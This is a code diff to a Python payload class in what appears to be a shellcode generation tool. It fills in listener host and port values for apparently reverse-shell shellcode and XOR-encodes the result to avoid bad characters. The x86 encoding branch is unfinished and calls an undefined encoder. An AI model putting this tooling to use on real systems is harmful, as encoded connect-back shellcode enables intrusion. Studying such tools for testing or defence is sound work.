@@ -1,4 +1,5 @@
-from extra_functions.xor_encode import Encoder
+from extra_functions.xor_encode64 import Encoder64
+from extra_functions.xor_encode86 import Encoder86
 from extra_functions.set_address_shellcodes import get_address
 from struct import pack
 from socket import inet_aton
@@ -30,10 +31,19 @@ class Payload():
         port =self.options["lport"][1]
         host = self.options["lhost"][1]
         if self.options["encode"][1]:
-            sh_aux = self.shellcode % (pack(">h",int(port)), inet_aton(host))
-            enc = Encoder(sh_aux,self.arq, self.options["badchars"][1])
+            if self.arq == "x64":
+                sh_aux = self.shellcode % (pack(">h",int(port)), inet_aton(host))
+                enc = Encoder64(sh_aux, self.options["badchars"][1])
+            else:
+                sh_aux = self.shellcode % (inet_aton(host), pack(">h",int(port)))
+                print("Encode to x86 TO-DO")
             sh_aux = enc.execute()
-        sh_aux = self.shellcode % (get_address(port, host))
+        else:
+            p, h = get_address(port, host)
+            if self.arq == "x64":
+                sh_aux = self.shellcode % (p,h)
+            else:
+                sh_aux = self.shellcode % (h,p)
         return sh_aux
 
     def put(self, key, value):
@@ -70,4 +80,3 @@ class Payload():
             else:
                 print("  |--> ", aux_value)
         print("__________________________________________________________________\n")
-
